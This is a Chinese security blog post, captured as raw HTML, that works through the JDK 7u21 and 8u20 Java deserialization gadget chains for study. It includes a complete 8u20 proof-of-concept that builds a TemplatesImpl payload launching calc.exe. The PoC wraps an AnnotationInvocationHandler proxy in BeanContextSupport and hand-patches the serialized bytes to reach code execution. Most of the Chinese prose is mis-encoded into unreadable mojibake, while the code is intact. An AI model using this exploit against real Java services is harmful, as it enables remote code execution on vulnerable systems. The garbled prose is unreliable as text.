-1;å¯¼è‡´çš„in.read()ä¸º-1 ï¼Œç„¶åè¿›å…¥throw\nè·Ÿè¸ªå‘ç°ä½ çš„ç±»é‡å†™readObjectç„¶åè°ƒç”¨defaultReadObject()ï¼Œååºåˆ—åŒ–å°±ä¼šè¿›å…¥ä¸‹æ–¹ä»£ç ï¼Œè€ŒdefaultDataEndè¿™ä¸ªå€¼åˆ™è·Ÿè¯¥ç±»æœ‰æ²¡æœ‰writeObject()æœ‰å…³ï¼Œæ²¡æœ‰çš„è¯è¿™é‡Œå°±ä¼šç»™defaultDataEnd = trueï¼Œç„¶åè¿™å°±æ˜¯å¯¼è‡´ä¸Šæ–¹æŠ¥é”™çš„æ ¹æœ¬åŸå› å—ï¼Ÿï¼Ÿï¼ŸNo\nå…¶å®è¿™åªæ˜¯å…¶ä¸­ä¸€ä¸ªåŸå› ï¼ˆæˆ–è€…è¯´ä¸æ˜¯æ ¹æœ¬åŸå› ï¼‰ï¼Œå¦‚æœBeanContextSupportå­˜ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å› ä¸ºè¿™ä¸ªå¯¹è±¡çš„ç±»æ²¡æœ‰writeObject()å°±æŠ¥é”™ï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹å¤ªè ¢äº†å‘€ã€‚äºæ˜¯å†™äº†ä¸ªdemo\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.ReadWrite; import ysoserial.payloads.util.Reflections; import java.beans.beancontext.BeanContextSupport; import java.util.HashMap; import java.util.LinkedHashSet; public class serSupport { public static void main(String[] args) throws Exception { Test2 test = new Test2(); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\"serializable\",1); HashMap tmpMap = new HashMap\u003c\u003e(); tmpMap.put(test,null); Reflections.setFieldValue(b,\"children\",tmpMap); String test2=\"test2\"; TemplatesImpl templates = new TemplatesImpl(); LinkedHashSet set = new LinkedHashSet();//è¿™æ ·å¯ä»¥ç¡®ä¿å…ˆååºåˆ—åŒ– templates å†ååºåˆ—åŒ– proxy set.add(b); set.add(test2); set.add(templates); byte[] ser = Serializer.serialize(set); ReadWrite.writeFile(ser,\"serobj.txt\"); Deserializer.deserialize(ser); } } Test2\nimport ysoserial.Deserializer; import ysoserial.payloads.util.ReadWrite; import java.io.IOException; import java.io.ObjectInputStream; import java.io.Serializable; public class Test2 implements Serializable { public static void main(String[] args) throws Exception{ byte[] bytes = ReadWrite.readFile(\"ser+.txt\"); Deserializer.deserialize(bytes); } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); } } ç„¶åä½ ä¼šå‘ç°å¹¶æ²¡æœ‰æŠ¥é”™ï¼Œè€Œä¸”defaultDataEnd = trueä¹Ÿèµ‹å€¼äº†çš„ã€‚å…ˆçœ‹çœ‹åºåˆ—åŒ–æ•°æ®å§ï¼Œç”¨zkarçœ‹çš„\næˆ‘å…ˆè§£é‡Šä¸‹è¿™æ®µæ•°æ®ä½äºå•¥åœ°æ–¹ï¼Œæœ€å¤–å±‚æ˜¯java.util.LinkedHashSetçš„[]ClassDataï¼Œå°±æ˜¯è®°å½•LinkedHashSetä¸­æ¯ä¸ªå±æ€§å¯¹åº”çš„å€¼ï¼Œç„¶åä¸ºå•¥å•ç‹¬æ‹¿è¿™ä¸ªåœ°æ–¹æ¥è¯´å‘¢ï¼Œçœ‹3é‚£ä¸ªä½ç½®ï¼Œè¿™ä¸ªå¯¹æˆ‘ä»¬æ¥è¯´å¾ˆé‡è¦ï¼Œå› ä¸ºè¿™é‡Œæ˜¯æŠ¥é”™äº§ç”Ÿçš„ä½ç½®ã€‚\nç„¶åæ²¡æœ‰çœ‹è¿‡åºåˆ—åŒ–æ•°æ®çš„å¸ˆå‚…å»ºè®®è·Ÿç€è¿™ä¸ªæ€ç»´å¯¼å›¾çœ‹ï¼Œè¿˜æ˜¯æŒºå»ºè®®çœ‹çš„ï¼ŒæŠŠæ¯ä¸ªå€¼çš„æ³¨é‡Šå«ä¹‰ä»¥åŠå®Œæ•´çœ‹ä¸€ä¸ªåºåˆ—åŒ–æ•°æ®åŸºæœ¬ä¸Šå°±éƒ½èƒ½çœ‹æ‡‚äº†ã€‚\nç„¶åç®€å•æä¸€ç‚¹å§@ObjectAnnotationåœ¨æ•°æ®é‡Œé¢å½“æ—¶æ²¡çœ‹æ‡‚çš„ï¼Œåé¢çœ‹åˆ°ä¸‹å›¾è¿™ä¸ªæ‰ç†è§£ï¼Œå¯ä»¥ç†è§£ä¸ºåºåˆ—åŒ–æ•°æ®å§ï¼ˆåˆšå¼€å§‹çœ‹çš„æ—¶å€™å›°æƒ‘äº†ä¸‹ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç®€å•æä¸€ä¸‹\nç„¶åä½ ä¼šçœ‹åºåˆ—åŒ–æ•°æ®åï¼Œä½ è‚¯å®šè¿˜å…³å¿ƒä¸€ä¸ªç‚¹@ClassDescFlagsï¼Œå¯ä»¥çœ‹åˆ°Test2æ˜¯æ²¡æœ‰SC_WRITE_METHODè¿™ä¸ªå€¼ï¼Œé‚£ä»–ä¸ºä»€ä¹ˆæ²¡æœ‰æŠ¥é”™æï¼Ÿ\n@ClassName @Length - 5 - 0x00 05 @Value - Test2 - 0x54 65 73 74 32 @SerialVersionUID - 6232696428067116234 - 0x56 7e fc 61 0b c9 54 ca @Handler - 8257558 @ClassDescFlags - SC_SERIALIZABLE - 0x02 å›åˆ°æ­£é¢˜ æˆ‘ä»¬åœ¨èµ‹å€¼trueåå¾€åè·Ÿè¸ªï¼Œ\nå‘ç°Test2ååºåˆ—åŒ–å®Œæˆåï¼Œä¼šæŠŠdefaultDataEnd = falseé‡æ–°è¦†ç›–æ‰çš„ã€‚ï¼ˆæ‰€ä»¥æ²¡æœ‰writeObject()ä¸æ˜¯ç½ªé­ç¥¸é¦–ï¼‰\nç„¶åå†ååºåˆ—åŒ–nullï¼Œå†åˆ°ååºåˆ—åŒ–count = ois.readInt();ï¼ˆåœ¨ç»“åˆä¸Šé¢åºåˆ—åŒ–æ•°æ®åˆ†æçš„ï¼‰è¿‡ç¨‹æ˜¯è¿™æ ·ã€‚readInt()ç»“æŸåï¼Œä¹Ÿå°±æ„å‘³ç€BeanContextSupportååºåˆ—åŒ–ç»“æŸäº†ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªå¯¹è±¡äº†String test2çš„ååºåˆ—åŒ–äº†ï¼ˆè¿™é‡Œä¸ºä»€ä¹ˆè¯´è¿™ä¸ªï¼Œå¯¹åé¢ç†è§£æ˜¯æœ‰ç”¨çš„\ndebugè¡¨è¾¾å¼\nString.format(\"0x%02X\",(int)bin.in.in.buf[(int)bin.in.in.pos-1]) AnnotationInvocationHandler throwåŸå›  é‚£AnnotationInvocationHandleræ˜¯ä»€ä¹ˆåŸå› å‘¢è‡ªç„¶æ˜¯è·Ÿä»–readObjectæŠ¥é”™æ˜¯æœ‰å…³ç³»çš„ã€‚\næŠ¥é”™æœ€åthrowçš„æ˜¯IOExceptionçš„æŠ¥é”™ï¼Œç„¶åä¸‹å›¾2æ˜¯æ•è·ClassNotFoundExceptionæŠ¥é”™çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸ä¼šè¿›å…¥catchï¼Œè€Œæ˜¯**èµ°å®Œfinallyï¼ˆæ²¡èƒ½æ‰§è¡ŒdefaultDataEnd = falseï¼‰ç»§ç»­è·³è½¬åˆ°ä¸Šå±‚throw**ï¼ˆè¿™ä¸ªæ­¥éª¤é‡å¤äº†å‡ æ¬¡ï¼‰ï¼Œæœ€åæ‰è¢«BeanContextSupportçš„catchæ•è·IOException\näºæ˜¯è¿™é‡Œåˆå¤šäº†ä¸€å±‚ç†è§£ï¼ŒåŠBeanContextSupportcatchèƒ½æ•è·çš„errorè¦åŒ…å«AnnotationInvocationHandlerçš„throwæ‰è¡Œè€Œä¸åªæ˜¯æ»¡è¶³åŒå±‚try/catchç»“æ„\nåŸå› å°ç»“ æ‰€ä»¥å°±æ˜¯readObjectæŠ¥é”™å¯¼è‡´é€€å‡ºäº†ï¼Œä»è€Œæ²¡èƒ½è®©defaultDataEnd = falseé‡æ–°è¦†ç›–æ‰ã€‚å¯¼è‡´readInt()æŠ¥é”™ã€‚è€Œæ·»åŠ SC_WRITE_METHODåªæ˜¯æˆ‘ä»¬åˆ©ç”¨çš„æ‰‹æ®µï¼Œä¸æ˜¯åŸå› \nbyte[] flagsReplace = new byte[]{0x02,0x00,0x02}; int i = ByteUtil.getSubarrayIndex(ser,flagsReplace); ser = ByteUtil.deleteAt(ser,i); ser = ByteUtil.addAtIndex(ser,i, (byte) 0x03); æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æŠŠflags 0x02æ”¹æˆ0x03ï¼ˆSC_WRITE_METHODå€¼æ˜¯0x01æ‰€ä»¥è¿™é‡Œ+1ï¼‰ï¼Œè¿™é‡Œzkarçœ‹åºåˆ—åŒ–æ•°æ®æŠ¥é”™äº†ï¼Œå¯ä»¥ç”¨å¦ä¸€ä¸ªå·¥å…·æ›¿ä»£ä¸‹SerializationDumper\nC:\\TOOLS\\Java\\jdk-17\\bin\\java.exe -jar SerializationDumper-v1.14.jar -f C:\\Users\\26618\\Desktop\\Ljava\\jdk7u21-8u20\\ser+.txt å†æ¬¡è°ƒè¯• ä»defaultDataEnd = trueæœ€åé‚£ä¸ª}é‚£é‡Œå¼€å§‹å§ï¼Œç„¶åå‘ç°ä¼šä¸€è·¯throwåˆ°BeanContextSupportcatch continue;ï¼Œç›´æ¥é€€å‡ºäº†BeanContextSupportåŒ…è£¹ç±»çš„ååºåˆ—åŒ–ï¼Œç›´æ¥æ¥åˆ°deserializeçš„ois.readInt();\nå¯¼è‡´çš„é—®é¢˜ å¯¼è‡´äº†ä¸ªä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ\nmapçš„keyæ˜¯AnnotationInvocationHandlerï¼Œè€Œæˆ‘ä»¬è®¾ç½®çš„mapçš„valueæ˜¯nullï¼Œè¿™é‡ŒAnnotationInvocationHandlerååºåˆ—åŒ–å®Œå°±ä¸­æ–­äº†mapçš„ååºåˆ—åŒ–å¯¼è‡´**nullæ²¡æœ‰ååºåˆ—åŒ–**ï¼Œè€Œç¨‹åºç›´æ¥æ¥åˆ°äº†ois.readInt();ï¼Œåºåˆ—åŒ–æ•°æ®in.in.poså´è¿˜åœ¨nullå€¼çš„ä½ç½®ï¼Œç„¶åå¯¼è‡´throw\nç„¶è€Œè¿™ä¸ªnullå¹¶ä¸å½±å“æˆ‘ä»¬åˆ©ç”¨ï¼Œæ‰€ä»¥ç›´æ¥æŠŠè¿™ä¸ªå€¼åˆ æ‰å°±å¥½\nè¿™é‡Œå†æä¸€å˜´nullä¸ºä»€ä¹ˆåˆ æ‰æ²¡äº‹ã€‚ä»¥åŠä¸ºä»€ä¹ˆè¦åˆ é™¤\nè¿˜è®°å¾—ä¸Šé¢é‚£ä¸ªåºåˆ—åŒ–æ•°æ®å›¾çš„åˆ†æä¹ˆï¼Œä¸‹å›¾è¿™é‡Œæ˜¯åŒä¸€ä¸ªä½ç½®å«ä¹‰å·®ä¸å¤šï¼Œè¿™é‡Œè°ƒè¯•å¯¹åº”çš„åœ°æ–¹æ˜¯TC_NULL,è€Œintå¯¹åº”çš„æ˜¯TC_BLOCKDATAï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®©TC_BLOCKDATAæå‰ï¼Œè€Œä¸ºä»€ä¹ˆæ²¡å½±å“å‘¢ï¼ŒreadInt()åå…¶å®å°±æ ‡å¿—ç€BeanContextSupportååºåˆ—åŒ–çš„ç»“æŸï¼Œç„¶åç´§æ¥ç€è¦ååºåˆ—åŒ–addçš„ç¬¬äºŒä¸ªå¯¹è±¡äº†ï¼ˆä¸‹å›¾æ˜¯æŒ‡å‘TemplatesImplçš„Handlerï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½æ·»åŠ å€¼ï¼Œåªèƒ½åˆ é™¤å€¼ï¼Œå› ä¸ºæ·»åŠ å€¼ä¼šå¯¹åé¢çš„ååºåˆ—åŒ–ç…§æˆå½±å“ï¼Œè€Œåˆ é™¤TC_NULLèƒ½åœ¨å‰é¢å®Œæˆé—­ç¯ã€‚\næœ€ç®€æ´poc å¤§åŠŸå‘Šæˆï¼Œæˆ‘ä»¬æ²¡æœ‰ç›´æ¥ç»™AnnotationInvocationHandleræ”¹å†™ä¸€ä¸ªwriteObjectï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¸€ä¸ªæ–‡ä»¶å°±å¯ä»¥æ‰§è¡Œäº†\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.ByteUtil; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.ReadWrite; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.beans.beancontext.BeanContextSupport; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class jdk8u20_poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(\"calc.exe\"); InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(\"sun.reflect.annotation.AnnotationInvocationHandler\").newInstance(Override.class, new HashMap\u003c\u003e()); Reflections.setFieldValue(ih,\"type\", Templates.class); Templates proxy = Gadgets.createProxy(ih,Templates.class); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\"serializable\",1); HashMap tmpMap = new HashMap\u003c\u003e(); tmpMap.put(ih,null); Reflections.setFieldValue(b,\"children\",tmpMap); LinkedHashSet set = new LinkedHashSet();//è¿™æ ·å¯ä»¥ç¡®ä¿å…ˆååºåˆ—åŒ– templates å†ååºåˆ—åŒ– proxy set.add(b); set.add(templates); set.add(proxy); HashMap hm = new HashMap(); hm.put(\"f5a5a608\",templates); Reflections.setFieldValue(ih,\"memberValues\",hm); byte[] ser = Serializer.serialize(set); byte[] nullReplace = new byte[]{0x70,0x77,0x04,0x00,0x00,0x00,0x00,0x78,0x71}; byte[] flagsReplace = new byte[]{0x02,0x00,0x02}; int i = ByteUtil.getSubarrayIndex(ser,flagsReplace); ser = ByteUtil.deleteAt(ser,i); ser = ByteUtil.addAtIndex(ser,i, (byte) 0x03); int j = ByteUtil.getSubarrayIndex(ser,nullReplace); ser = ByteUtil.deleteAt(ser,j); ReadWrite.writeFile(ser,\"ser+.txt\"); byte[] bytes = ReadWrite.readFile(\"ser+.txt\"); Deserializer.deserialize(bytes); } } 8u20ä¿®å¤ æœ€ååå°„è°ƒç”¨çš„æ–¹æ³•åªèƒ½æ˜¯ä¸‹é¢3ä¸ªï¼Œå¯¼è‡´ä¸èƒ½è°ƒç”¨sinkç‚¹äº†\nåè¨€ï¼šå…¶å®æˆ‘è®°å½•çš„æ¯”è¾ƒç®€å•ï¼Œå…³äºå¯¼è‡´çš„é—®é¢˜è¿™é‡Œå¾—ç»è¿‡è°ƒè¯•ä»¥åŠæŸ¥çœ‹åºåˆ—åŒ–æºç æ‰èƒ½å¾—å‡ºï¼Œæˆ‘æœ€å¼€å§‹æ˜¯çœ‹å‚è€ƒæ–‡ç« ä»¥ä¸ºå°±é‚£ä¹ˆå›äº‹ï¼Œç„¶åæˆ‘æ˜¯æ‰“ç®—è¡¥å…¨é‚£ä¸ªintæ•°æ®çš„ï¼Œä¹Ÿå°±æ˜¯å¡«å……æ•°æ®ï¼Œç„¶åå‘ç”Ÿäº†æŠ¥é”™ï¼Œä»¥åŠæ„Ÿè§‰åˆ°ä¸€äº›ç–‘ç‚¹å§ã€‚åæ­£å°±å§‹ç»ˆè¯´æœä¸äº†è‡ªå·±ï¼Œä¸»è¦å°±æ˜¯å‚è€ƒæ–‡ç« é‡Œé¢åˆ é™¤é‚£ä¸¤ä¸ªæ•°æ®ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿæˆ‘çŸ¥é“æ˜¯å¯¹é½intï¼Œä½†æ˜¯ä¼šä¸ä¼šå¯¹å…¶ä»–æ•°æ®ç…§æˆå½±å“å‘¢ï¼Ÿç„¶åå°±è‡ªå·±ç¢ç£¨å“‡ï¼Œä¹Ÿæ˜¯æå¾—æ˜æ˜ç™½ç™½äº†å¾ˆçˆ½ã€‚ç„¶åè°ƒè¯•æ‰¾åºåˆ—åŒ–æ•°æ®é‡Œé¢å¯¹åº”çš„ä½ç½®ï¼Œå¯ä»¥é€šè¿‡å‰åposçš„å€¼å»æ‰¾\nå‚è€ƒ\nhttps://tttang.com/archive/1729/#toc_\nhttps://exp10it.io/2022/12/jdk-7u21-deserialization/#%E6%96%B0%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F\n",
  "wordCount" : "7181",
  "inLanguage": "zh",
  "datePublished": "2025-05-10T20:01:23+08:00",
  "dateModified": "2025-07-02T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      jdk7u21&amp; 8u20 æ·±åº¦åˆ†æ
    </h1>
    <div class="post-meta"><span title='2025-05-10 20:01:23 +0800 CST'>2025-05-10</span>&nbsp;Â·&nbsp;15 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#jdk7u21" aria-label="jdk7u21">jdk7u21</a><ul>
                            
                    <li>
                        <a href="#poc" aria-label="poc">poc</a></li>
                    <li>
                        <a href="#hash" aria-label="hash">hash</a></li>
                    <li>
                        <a href="#-string-hashcode--%e6%95%b4%e5%bd%a2%e6%ba%a2%e5%87%ba" aria-label="[*] String hashcode &amp;amp; æ•´å½¢æº¢å‡º">[*] String hashcode &amp; æ•´å½¢æº¢å‡º</a></li>
                    <li>
                        <a href="#-%e5%80%bc2" aria-label="[*] å€¼2">[*] å€¼2</a></li>
                    <li>
                        <a href="#put%e7%82%b9" aria-label="putç‚¹">putç‚¹</a></li>
                    <li>
                        <a href="#7u21%e7%9a%84%e4%bf%ae%e5%a4%8d" aria-label="7u21çš„ä¿®å¤">7u21çš„ä¿®å¤</a></li></ul>
                    </li>
                    <li>
                        <a href="#jdk8u20" aria-label="jdk8u20">jdk8u20</a><ul>
                            
                    <li>
                        <a href="#%e5%8f%8c%e5%b1%82trycatch" aria-label="åŒå±‚try/catch">åŒå±‚try/catch</a></li>
                    <li>
                        <a href="#tc_reference" aria-label="TC_REFERENCE">TC_REFERENCE</a></li>
                    <li>
                        <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="åˆ©ç”¨æ€è·¯">åˆ©ç”¨æ€è·¯</a></li>
                    <li>
                        <a href="#poc-%e6%8a%a5%e9%94%99" aria-label="poc æŠ¥é”™">poc æŠ¥é”™</a><ul>
                            
                    <li>
                        <a href="#%e5%9b%9e%e5%88%b0%e6%ad%a3%e9%a2%98" aria-label="å›åˆ°æ­£é¢˜">å›åˆ°æ­£é¢˜</a></li>
                    <li>
                        <a href="#annotationinvocationhandler-throw%e5%8e%9f%e5%9b%a0" aria-label="AnnotationInvocationHandler throwåŸå› ">AnnotationInvocationHandler throwåŸå› </a></li>
                    <li>
                        <a href="#%e5%8e%9f%e5%9b%a0%e5%b0%8f%e7%bb%93" aria-label="åŸå› å°ç»“">åŸå› å°ç»“</a></li>
                    <li>
                        <a href="#%e5%86%8d%e6%ac%a1%e8%b0%83%e8%af%95" aria-label="å†æ¬¡è°ƒè¯•">å†æ¬¡è°ƒè¯•</a></li>
                    <li>
                        <a href="#%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98" aria-label="å¯¼è‡´çš„é—®é¢˜">å¯¼è‡´çš„é—®é¢˜</a></li>
                    <li>
                        <a href="#%e6%9c%80%e7%ae%80%e6%b4%81poc" aria-label="æœ€ç®€æ´poc">æœ€ç®€æ´poc</a></li></ul>
                    </li>
                    <li>
                        <a href="#8u20%e4%bf%ae%e5%a4%8d" aria-label="8u20ä¿®å¤">8u20ä¿®å¤</a>
                    </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><p>å‰è¨€ï¼šæœ€è¿‘ç¼ºå°‘sinkç‚¹ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯æ€ä¹ˆåˆ©ç”¨åŸç”Ÿé“¾çš„</p>
<blockquote>
<p>ç„¶åjdk7u21å¯¹å…¶æ„é€ ç»†èŠ‚è¿›è¡Œäº†ä¸€äº›åˆ†æå§ï¼Œè‡ªæˆ‘æ„Ÿè§‰åˆ†æçš„æŒºå…¨çš„äº†ï¼Œæ²¡å•¥éš¾åº¦</p>
<p>jdk8u20ä¸»è¦æ˜¯æ ¹æ®å‚è€ƒç§è·³è·³ç³–é‚£ç¯‡æ–‡ç« ï¼Œå­¦ä¹ çš„ã€‚æœ‰ç‚¹éš¾åº¦çš„ã€‚æ€è·¯åˆ°ä¸éš¾ï¼Œå°±æ˜¯æœ€åé‚£ä¸ªæŠ¥é”™çš„å®Œå…¨ç†è§£ä»€ä¹ˆåŸå› ä»¥åŠæ€ä¹ˆå¤„ç†ï¼æ„Ÿè§‰å‚è€ƒæ–‡ç« é‚£ä¸ªç‚¹ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œäºæ˜¯æ ¹æ®è‡ªå·±çš„ç†è§£åˆå»ç¢ç£¨ç¢ç£¨äº†é‚£ä¸ªç‚¹</p>
</blockquote>
<h2 id="jdk7u21">jdk7u21<a hidden class="anchor" aria-hidden="true" href="#jdk7u21">#</a></h2>
<blockquote>
<p>ç®€çŸ­æ¦‚è¿°ä¸‹å§ï¼Œåˆ©ç”¨<code>AnnotationInvocationHandler</code>#<code>invoke</code>æ–¹æ³•ä¸­<code>åŠ¨æ€ä»£ç†</code> <code>è°ƒç”¨çš„æ–¹æ³•ä¸ºequalsæ—¶</code>å¯¹åº”ifé€‰é¡¹é‡Œä»£ç ï¼Œå…¶ä¼šé€šè¿‡(<code>forå¾ªç¯</code>åå°„è°ƒç”¨)å»è°ƒç”¨<code>typeå±æ€§</code>çš„æ‰€æœ‰æ–¹æ³•ï¼ˆè¿™é‡Œä¹Ÿå°±è®¾ç½®<code>type</code>ä¸º<code>Templates.class</code>ï¼Œç„¶åè°ƒç”¨çš„<code>å¯¹è±¡</code>ä¸º<code>equals(obj)</code>çš„å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œobjæ˜¯<code>TemplatesImpl</code>å³å¯è¿›è¡Œåˆ©ç”¨ï¼‰</p>
<p>ç„¶åè¿˜æœ‰ä¸ªéš¾ç‚¹æ˜¯hashçš„åˆ¤æ–­ï¼Œåˆ©ç”¨mapçš„<code>equals</code>ï¼Œéƒ½éœ€è¦æ„é€ ä¸€ä¸ªhashç›¸ç­‰çš„ä¸œè¥¿ï¼ˆè¿™é‡Œ7u21ä½œè€…çš„è®¾è®¡è¿˜æŒºæœ‰æ„æ€çš„ï¼‰é‚£å°±ä¸€èµ·ç®€å•çœ‹çœ‹å§</p>
</blockquote>
<p><strong>è°ƒç”¨é“¾</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">LinkedHashSet</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">LinkedHashSet</span><span class="p">.</span><span class="na">add</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">TemplatesImpl</span><span class="p">.</span><span class="na">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="n">X</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">LinkedHashSet</span><span class="p">.</span><span class="na">add</span><span class="p">()</span><span class="w">
